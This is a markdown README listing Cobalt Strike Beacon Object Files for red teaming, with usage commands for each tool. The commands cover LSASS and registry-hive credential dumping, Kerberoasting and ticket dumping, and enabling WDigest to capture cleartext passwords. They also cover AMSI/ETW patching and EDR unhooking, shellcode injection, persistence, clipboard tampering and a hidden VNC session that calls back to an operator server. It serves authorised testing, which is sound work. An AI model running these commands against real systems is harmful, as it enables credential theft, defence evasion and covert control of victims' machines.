# CobaltStrike BOF Collections
Useful Cobalt Strike Beacon Object Files (BOFs) used during red teaming and penetration testing engagements.

---
### Enumeration

- [**TrustedSec Situational Awareness BOF**](https://github.com/trustedsec/CS-Situational-Awareness-BOF)<br />
BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
Example commands include:<br />
```
arp --> List arp tables
ipconfig --> Run ipconfig
ldapsearch [query]
listdns --> Pulls DNS cache
netuser [username] [opt: domain] --> Get info on user account
nslookup [hostname] --> Perform DNS query
tasklist --> Get local running processes
```

- [**Find Objects BOF**](https://github.com/outflanknl/FindObjects-BOF)<br />
Use direct system calls to enumerate processes for specific loaded modules (amsi.dll, clr.dll) or process handles (lsass.exe)<br />
Avoids fork&run<br />
```
FindModule amsi.dll
FindProcHandle lsass.exe
```

- [**BOF Collection**](https://github.com/rvrsh3ll/BOF_Collection)<br />
A set of BOFs useful for enumeration and exploitation. Examples include:<br />
```
inline-execute GetDomainInfo.o --> Get domain info from DC

inline-execute GetClipboard.o --> Prints any text on the user's clipboard

enumwifi --> Enumerate wifi connections
dumpwifi Wifi_Profile_Name --> Dump wifi cleartext credentials

bofportscan 192.168.1.10 3389 --> Port scanner

inline-execute RegistryPersistence.o Install --> Install registry persistence
inline-execute RegistryPersistence.o Remove --> Remove registry persistence
```

- [**whereami**](https://github.com/boku7/whereami)<br />
A "Where Am I" BOF which is a way to run the whoami.exe binary but in an opsec safe way by pulling the info from the current beacon process memory.<br />
Also pulls current environment variables.<br />
```whereami```

- [**RiccardoAncarani BOFs**](https://github.com/RiccardoAncarani/BOFs)<br />
A useful BOF collection to perform various tasks in a safer opsec way.
```
send_shellcode_via_pipe <pipe> <file> --> Send shellcode or any byte via a named pipe
cat <file> --> Read file, supports remote shares
wts_enum_remote_processes <host> --> Enumerate remote processes using WTS APIs
unhook <module>, unhook ntdll.dll --> Use direct syscalls to unhook APIs of a specific DLL (works only on 64-bit beacons)
```

- [**Outflank C2 Tool Collection**](https://github.com/outflanknl/C2-Tool-Collection)<br />
Great list of useful tools converted to BOFs for better opsec.<br />
Tools like add machine account, kerberoast, LAPS password dump, SMB info, LDAP AD spray, and more!
```
GetMachineAccountQuota --> Get domain machine account quota
AddMachineAccount [*Computername] [Optional Password] --> Create new machine account - requires MachineAccountQuota to create new account
Domaininfo --> Enumerate AD domain
Kerberoast list --> List SPN enabled accounts
Kerberoast roast SamAccountName --> Kerberoast specific username
Lapsdump <computername> --> Dump LAPS passwowrds on remote systems within AD (requires elevated privileges on target)
Psc --> Show detailed information from processes with established TCP and RDP connections
Psw --> 	Show window titles from processes with active windows
Psx --> Show detailed information from all processes running on the system and provides a summary of installed security products and tools.
Smbinfo <compuername> --> Get SMB info of remote system instead of using CS portscan SMB
Winver --> Shows the version of Windows that is running on the local system
```

- [**tgtdelegation**](https://github.com/sliverarmory/tgtdelegation)<br />
Kerberos ticket delegation - Obtain usable TGTs for the current user, does not require Admin privileges!<br />
Request TGT of active user in the current domain obtained from USERDNSDOMAIN environment variable, outputs TGT blobs to .kirbi and .ccache files<br />
```
tgtdelegation currentdomain default
[+] received output:
[+] tgtdelegation succeeded!

[+] Invoking tgtParse.py to obtain a usable .ccache!

[+] Successfully decrypted the AP-REQ response!

[+] Local path to usable .ccache: /home/loki@MARVEL.LOCAL.ccache
[+] Local path to usable .kirbi: /home/loki@MARVEL.LOCAL.kirbi
```
Now use .ccache or .kirbi files to load TGT into memory <br />
```export KRB5CCNAME=/home/loki@MARVEL.LOCAL.ccache``` <br />
Continue to use ticket in memory with other tooling of your choice! (i.e. Impacket's "**-k -no-pass**" command) <br />


- [**PrivKit**](https://github.com/mertdas/PrivKit)<br />
Windows privilege escalation BOF kit used for detecting priv esc vulnerabilities including unquoted service paths, hijackable paths, autologon registry keys, etc.<br />
Check for all vulnerabilities supported: <br />
```privcheck```

---
### Executing .NET Assemblies

- [**InlineExecute-Assembly**](https://github.com/anthemtotheego/InlineExecute-Assembly)<br />
Perform .NET assembly execution of any .NET executable without any prior modifications required<br />
The BOF also supports several flags to disabling AMSI via in memory patching, disabling and restoring ETW via in memory patching, or customization of the CLR App Domain name to be created<br />
```inlineExecute-Assembly --dotnetassembly /home/Seatbelt.exe --assemblyargs AntiVirus AppLocker --etw --amsi --mailslot totallyLegitMailslot```

- [**inject-assembly**](https://github.com/kyleavery/inject-assembly)<br />
Another alternative .NET executable loader to inject an assembly into a running process<br />
```inject-assembly 0 /home/Rubeus.exe [args...]```

- [**BOF.NET**](https://github.com/CCob/BOF.NET)<br />
Critical tool for red teams that allows you to run .NET assemblies as BOFs within the beacon process<br />
```
bofnet_init --> Start BOF.NET
bofnet_listassemblies --> List loaded .NET assemblies
bofnet_load /Path/To/Assembly.exe --> Load assembly
bofnet_execute bof_name [args] --> Execute assembly
bofnet_shutdown --> Kill BOF.NET
```

---
### Exploitation

- [**ajpc500 BOFs**](https://github.com/ajpc500/BOFs)<br />
A collection of **very** useful BOFs for various utilities including different techniques of shellcode injection with syscalls, process dumping (LSASS!), and patching ETW for better evasion.<br />
```
etw stop --> Patch etw
syscalls_inject <PID> <listener_name> / syscalls_shinject <PID> <path_to_bin> --> Syscalls shellcode injection
syscalls_spawn <listener> / syscalls_shspawn <path_to_bin> --> Spawn and syscalls injections
static_syscalls_apc_spawn <listener> / static_syscalls_apc_spawn <path_to_bin> --> Spawn and static syscalls shellcode njection (NtQueueApcThread)
static_syscalls_inject <PID> <listener_name> / static_syscalls_shinject <PID> <path_to_bin> --> Static syscalls shellcode injection (NtCreateThreadEx)
static_syscalls_dump <PID> [path_to_output] --> Process dump with syscalls (i.e. Dump LSASS!)
```

- [**MiniDumpWriteDump**](https://github.com/rookuu/BOFs)<br />
Uses static syscalls to dump a process such as LSASS to output file<br />
```minidumpwritedump <PID> <path_of_dmp?>```

- [**SilentLsassDump**](https://github.com/josephkingstone/BOFs-2/)<br />
Uses direct syscalls generated from [https://github.com/outflanknl/InlineWhispers](InlineWhispers)<br />
Dump the LSASS process via the silent process exit mechanism into the C:\Temp directory<br />
```silentLsassDump <LSASS PID>```

- [**RegSave BOF**](https://github.com/EncodeGroup/BOF-RegSave)<br />
BOF to dump SAM, SYSTEM, and SECURITY database from a local system. <br />
```
bof-regsave c:\temp\ --> Dumps SAM database files to target folder C:\temp\
```

- [**Unhook BOF**](https://github.com/rsmudge/unhook-bof)<br />
Created by Raphael Mudge, this BOF will attempt to unhook userland APIs to bypass EDR<br />
Sort of the "hail mary" for attempting to unhook APIs<br />
 ```unhook```

- [**WdToggle**](https://github.com/outflanknl/WdToggle)<br />
Enables WDigest credential caching using direct system calls<br />
Bypasses Windows Credential Guard if enabled<br />
```
inline-execute WdToggle.o --> First enable WdDigest caching
logonpasswords --> Second, wait for users to login and then run Mimikatz to dump their newly cached cleartext passwords
```

- [**TrustedSec CS-Remote-OPs-BOF**](https://github.com/trustedsec/CS-Remote-OPs-BOF)<br />
Great repo of new BOFs from TrustedSec to follow up their SituationalAwareness BOFs.<br />
Includes dumping a process, decrypting Chrome keys, persistence techniques (registry, scheduled tasks, services), and more!
```
adcs_request --> Request an enrollment certificate
procdump --> Dump specified process to output file
reg_set --> Set/create a registry key
sc_create --> Create a new service
schtaskscreate --> Create a new scheduled task
setuserpass --> Set a users password
```

- [**Inject AMSI Bypass**](https://github.com/boku7/injectAmsiBypass)<br />
BOF that bypasses AMSI in a remote process with code injection<br />
```inject-amsiBypass <PID>```

- [**Inject ETW Bypass**](https://github.com/boku7/injectEtwBypass)<br />
Inject ETW Bypass into Remote Process via Syscalls<br />
```injectEtwBypass <PID>```

- [**Kerberoast BOF**](https://github.com/cube0x0/BofRoast)<br />
BOF for targeted Kerberoasting against input SPN to roast<br />
Returns TGS that you can pass to apreq2hashcat.py (provided in repo) to output the hashcat format<br />
```kerberoast SPN/HOSTNAME.domain.local```

- [**Koh**](https://github.com/GhostPack/Koh)<br />
GhostPack BOF that allows for the capture of user credentials via purposeful token/logon session leakage.<br />
Koh has a BOF client for capturing logon tokens in Cobalt Strike and a C# capture server to negotiate captured tokens for new logon sessions.<br />
```
# Koh client BOF
help koh
  koh list              - lists captured tokens
  koh groups LUID       - lists the group SIDs for a captured token
  koh filter list       - lists the group SIDs used for capture filtering
  koh filter add SID    - adds a group SID for capture filtering
  koh filter remove SID - removes a group SID from capture filtering
  koh filter reset      - resets the SID group capture filter
  koh impersonate LUID  - impersonates the captured token with the give LUID
  koh release all       - releases all captured tokens
  koh release LUID      - releases the captured token for the specified LUID
  koh exit              - signals the Koh server to exit

koh list --> List current logon sessions
koh impersonate <LUID> --> Impersonate a logon session from above output

ls \\dc.theshire.local\C$ --> Use the impersonated privileged logon session to interact with a target system
```

- [**Cobalt-Clip**](https://github.com/DallasFR/Cobalt-Clip)<br />
A clipboard add-on for Cobalt Strike to interact with the victim's clipboard. With Cobalt-Clip you can dump, edit and monitor the content of a clipboard.<br />
```
dumpclip --> Dump current contents of clipboard
set-clipboard-data --> Modify victims clipboard data
clipmon --> Monitor the clipboard for new content and output to console
```

- [**BOF-patchit**](https://github.com/ScriptIdiot/BOF-patchit/)<br />
A very easy solution to patch AMSI or ETW. Patches AMSI/ETW for the currently running x64 process.
```
patchit check --> List if AMSI or ETW are currently patched
patchit all --> Patch both AMSI and ETW
patchit amsi --> Only patch AMSI
patchit etw --> Only patch ETW

# DO NEFARIOUS STUFF HERE....

patchit revertAll --> Revert both AMSI and ETW
patchit revertAmsi --> Revert only AMSI
patchit revertEtw --> Revert only ETW
```

- [**ScreenshotBOF**](https://github.com/CodeXTF2/ScreenshotBOF)<br />
Uses WinAPI and avoids fork&run to take a screenshot.<br />
`screenshot_bof output.bmp 1`

- [**nanorubeus**](https://github.com/wavvs/nanorobeus)<br />
BOF equivalent of Rubeus for managing Kerberos tickets. It can be used cross-platform for multiple C2s including Cobalt Strike, Sliver and Brute Ratel.<br />
```
nanorobeus64 luid --> Get logon current ID
nanorobeus64 klist --> List all Kerberos tickets
nanorobeus64 dump /all --> Dump all Kerberos tickets, requires local admin privileges
nanorobeus64 kerberoast /spn:HTTP/server.fortress.local --> Kerberoast a specific SPN
```

---
### Miscellaneous

- [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)<br />
Used for creating your very own BOFs!

- [**BOF Hound**](https://github.com/fortalice/bofhound)<br />
An offline BloodHound ingestor and LDAP parser to be used with TrustedSec's ["ldapsearch"](https://github.com/trustedsec/CS-Situational-Awareness-BOF).<br />
Use ldapsearch in Cobalt Strike to gather data and then use bofhound on your CS logs to generate JSON files for importing into BloodHound.<br />
```bofhound -o /data/```

- [**Help Color**](https://github.com/outflanknl/HelpColor)<br />
Color helper Aggressor script for coloring "help" output based on command type and OPSEC<br />
```helpx```

- [**Hidden Desktop BOF**](https://github.com/WKL-Sec/HiddenDesktop)<br />
Uses VNC connection and server to create a hidden remote desktop connection to your target instead of using RDP. <br />
```
Start the HVNC server first
HiddenDesktop <server> <port> --> Start a hidden desktop client connection to your listening server
hd-launch-explorer --> Then start the Windows explorer browser which should pop up a new window on your system
```
